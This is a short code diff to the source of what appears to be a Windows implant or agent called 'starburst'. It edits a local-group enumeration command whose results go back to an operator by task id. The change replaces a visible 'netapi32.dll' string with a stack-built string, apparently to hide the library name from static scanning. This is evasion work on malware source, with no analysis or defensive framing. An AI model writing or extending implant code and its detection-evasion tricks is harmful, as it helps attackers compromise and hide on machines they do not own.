@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_NET_LOCALGROUP
 
@@ -23,8 +24,8 @@ auto declfn starburst::cmd_net_localgroup(
     _In_    char*     task_uuid,
     _In_    Parser*   params
 ) -> void {
-    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
-        symbol<LPCSTR>( "netapi32.dll" ) ) );
+    STK_NETAPI32(_n);
+    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
